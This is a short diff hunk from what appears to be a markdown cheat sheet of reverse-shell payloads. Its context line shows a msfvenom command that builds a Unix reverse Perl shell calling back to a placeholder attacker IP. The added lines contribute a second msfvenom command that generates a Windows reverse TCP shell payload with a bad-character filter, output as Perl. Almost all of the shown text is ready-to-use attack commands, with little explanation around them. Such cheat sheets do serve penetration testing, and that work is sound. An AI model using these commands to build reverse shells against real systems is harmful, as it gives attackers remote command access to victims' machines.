@@ -21,3 +21,7 @@ Ruby payload:
 ```
 msfvenom -p cmd/unix/reverse_perl LHOST=<attacker_IP> LPORT=4000 -f raw
 ```
+a payload example for msfvenom
+```
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
+```
